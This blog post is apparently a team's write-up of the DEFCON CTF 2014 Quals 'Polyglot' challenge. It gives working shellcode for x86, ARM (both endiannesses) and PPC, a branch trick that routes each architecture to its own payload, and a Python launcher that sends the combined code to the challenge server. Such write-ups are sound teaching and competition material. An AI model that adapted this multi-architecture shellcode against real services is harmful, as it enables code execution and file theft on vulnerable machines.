---
layout: post
title: "DEFCON CTF 2014 Quals Writeups"
description: ""
category: writeups
tags:
- defcon
- 2014
- writeup
---
<!--{% include JB/setup %}-->

<a href="polyglot"></a>

### Gynophage 4 - Polyglot

    polyglot_9d64fa98df6ee55e1a5baf0a170d3367.2014.shallweplayaga.me 30000 
    Password: w0rk_tHaT_tAlEnTeD_t0nGu3

When we connect and supply the password, we see

    Give me shellcode.  You have up to 0x1000 bytes.  All GPRs are 0.  PC is 0x41000000.  SP is 0x42000000.

If we send garbage, we see
    
    Throwing shellcode against linux26-x86.(http://services.2014.shallweplayaga.me/polyglot_9d64fa98df6ee55e1a5baf0a170d3367)

Then,

    Didn't send back the right value.  Fail.

Our objective was to print out `/flag` on each target machine. We found [some shellcode to print out a file](http://www.shell-storm.org/shellcode/files/shellcode-73.php), and modified it to print `/flag` instead. 

    "\x31\xc0\x31\xdb\x31\xc9\x31\xd2"+\
    "\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"+\
    "\x80\x89\xc6\xeb\x06\xb0\x01\x31"+\
    "\xdb\xcd\x80\x89\xf3\xb0\x03\x83"+\
    "\xec\x01\x8d\x0c\x24\xb2\x01\xcd"+\
    "\x80\x31\xdb\x39\xc3\x74\xe6\xb0"+\
    "\x04\xb3\x01\xb2\x01\xcd\x80\x83"+\
    "\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"+\
    "\xff/flag\x00\x00"

If we send this shellcode raw to the service, we advance to the next level:

    Throwing shellcode against linux26-armel.(http://services.2014.shallweplayaga.me/polyglot_6a3875ce36a55889427542903cd43893)

In the end, we needed to devise shellcode to work on Linux on x86, ARMEL (little-endian), ARMEB (big-endian), and PPC. The strategy we used was to assemble a series of jumps so that each architecture would take a different jump to its own shellcode. In other instruction encodings, they must be legal, not alter control flow, and not cause illegal memory accesses. However, we don't need to worry about instructions after each jump for a given architecture. 

          o
         / \
        /\ x86
      PPC \
          /\
     ARMEL  ARMEB
    
x86's variable width instructions caused the greatest trouble. In particular, the middle two bytes of the PPC branch instructions of the form `48 00 XX XX` were interpreted in x86 as arithmetic with a register dereference. Since all GPRs were zero, this caused a segmentation fault on x86. So, we put the x86 jump in front followed by the remainder of the jumps. 

The branch part of our shellcode was:

           73 12 00 00 | 48 00 01 70 | 9a 00 00 40 | 13 00 00 ea
    x86    jmp 0x14    | <bypassed>  | <bypassed>  | <bypassed>
    PPC    andi  ...   | b 0x174     | <bypassed>  | <bypassed>
    ARMEB  tstvc ...   | stmdami ... | bls 0x110   | <bypassed>
    ARMEL  andeq ...   | andvc   ... | mulmi ...   | b 0x60

Graphically:

             X
            / \
    1      X  jmp
          / \   \
    2    X   b   x86
        / \   \
    3  X   bls PPC 
        \   \
    4    b   ARMEB
          \
           ARMEL

Then, we placed shellcode for x86 at 0x14, ARMEL shellcode at 0x60, ARMEB shellcode at 0x110, and PPC shellcode at 0x174. The x86 shellcode we used is described above. 

Our custom shellcode opened `/flag`, read it into the BSS section, wrote it to stdout, then exited. We used the same shellcode source for ARMEL and ARMEB:

    shellcode:
        add r0, pc, #(filename-shellcode-8)

        mov r7, #5
        mov r1, #0
        svc #0
        mov r0, a1

        mov r7, #3
        mov r3, #0x16000
        mov r1, r3
        mov r2, #4096
        svc #0
        mov r2, a1

        mov r7, #4
        mov r0, #1
        mov r1, r3

        svc #0

        mov r7, #1
        mov r0, #0
        svc #0

    filename:
        .string "/flag" 

We compiled this for ARMEL and ARMEB separately and used dd to copy out the text sections into raw binary files.

Our PPC shellcode is below. We had to hardcode the address of the BSS section of the provided binary by loading 0x1001 into r4, shifting it left 16 bytes, then loading the lower 2 bytes.

    shellcode:
        li      0, 5
        li      3, 0x41
        slwi    3, 3, 24
        addi    3, 3, (filename-shellcode+0x174)
        li      4, 0
        li      5, 0
        sc

        nop
        li      0, 3
        mr      3, 3
        li      4, 0x1001
        slwi    4, 4, 16
        ori     4, 4, 0x5a74
        li      5, 2048
        sc  

        nop
        mr      5, 3    
        li      0, 4
        li      3, 1
        li      4, 0x1001
        slwi    4, 4, 16
        ori     4, 4, 0x5a74
        sc  

        li      0, 1
        li      3, 0
        sc
        
    filename:
        .string "/flag"

We used a Python script to handle the assembly of the combined binary and the interaction with the server. `shellcode-ppc` was compiled manually on a different machine and moved over before each run. This is the script we used:

```python
    import sys
    import os
    import time
    from sock import *

    # dd for files!
    def os_dd(dst, src, skip=0, seek=0, count=0):
        print "dd'ing", dst, "to", src, "skip", skip, "seek", seek
        cmd = 'dd if=%s of=%s skip=%d seek=%d bs=1'%(src,dst, skip,seek)
        if count: cmd += ' count='+str(count)
        os.system(cmd)

    # dd for lists!
    def dd(dst, src, skip=0, seek=0, count=None):
        if not count: count = min(len(dst)-seek, len(src)-skip)
        for i in range(count): dst[seek+i] = src[skip+i]
        return dst

    X86_SIZE = 0x4c
    def get_x86_shellcode():
        shellcode = ''

        # world's shortest nopsled
        shellcode += "\x90"*4

        shellcode += "\x31\xc0\x31\xdb\x31\xc9\x31\xd2"+\
                     "\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"+\
                     "\x80\x89\xc6\xeb\x06\xb0\x01\x31"+\
                     "\xdb\xcd\x80\x89\xf3\xb0\x03\x83"+\
                     "\xec\x01\x8d\x0c\x24\xb2\x01\xcd"+\
                     "\x80\x31\xdb\x39\xc3\x74\xe6\xb0"+\
                     "\x04\xb3\x01\xb2\x01\xcd\x80\x83"+\
                     "\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"+\
                     "\xff"+\
                     "/flag\x00\x00"
        open('shellcode-x86.bin','w').write(''.join(shellcode))
        return shellcode


    ARMEL_START_OFFSET = 0x60
    def get_armel_shellcode():
        os.system('arm-linux-gnueabi-as shellcode-arm.s -o shellcode-armel')
        os_dd('shellcode-armel.bin','shellcode-armel', skip=52, count=0x50)
        return open('shellcode-armel.bin').read()

    ARMEB_START_OFFSET = 0x110
    def get_armeb_shellcode():
        os.system('arm-linux-gnueabi-as -mbig-endian shellcode-arm.s -o shellcode-armeb')
        os_dd('shellcode-armeb.bin','shellcode-armeb', skip=52, count=0x50)
        return open('shellcode-armeb.bin').read()

    PPC_START_OFFSET = 0x174
    def get_ppc_shellcode():
        # no compilation here yet
        os_dd('shellcode-ppc.bin','shellcode-ppc', skip=52, count=0x6e)
        return open('shellcode-ppc.bin').read()

    def get_branch():
        # x86 jump
        r = '\x73\x12\x00\x00'
        # PPC branch
        r += '\x48\x00\x01\x70'
        # ARMEL branch
        r += '\x9a\x00\x00\x40'
        # ARMEB branch
        r += '\x13\x00\x00\xea'
        return r

    def assemble():
        shellcode = ['X']*1024
        pc = 0
        branch = get_branch()
        shellcode = dd(shellcode, branch)
        pc = len(branch)
        shellcode = dd(shellcode, get_x86_shellcode(), seek=pc)
        pc = ARMEL_START_OFFSET
        shellcode += 'X' * (pc - len(shellcode))
        print "pc is now", pc
        shellcode = dd(shellcode, get_armel_shellcode(), seek=pc)
        pc = ARMEB_START_OFFSET
        shellcode += 'X' * (pc - len(shellcode))
        shellcode = dd(shellcode, get_armeb_shellcode(), seek=pc)
        pc = PPC_START_OFFSET
        shellcode += 'X' * (pc - len(shellcode))
        shellcode = dd(shellcode, get_ppc_shellcode(), seek=pc)
        open('shellcode-assembled','w').write(''.join(shellcode))
        return shellcode

    def test_live():
        con = Sock("polyglot_9d64fa98df6ee55e1a5baf0a170d3367.2014.shallweplayaga.me 30000")
        con.send_line('w0rk_tHaT_tAlEnTeD_t0nGu3')
        sys.stdout.write(con.read_one()+'\n\n')
        time.sleep(0.5)
        con.send(''.join(assemble()))
        while 1:
            sys.stdout.write(con.read_one(15))

    test_live()
```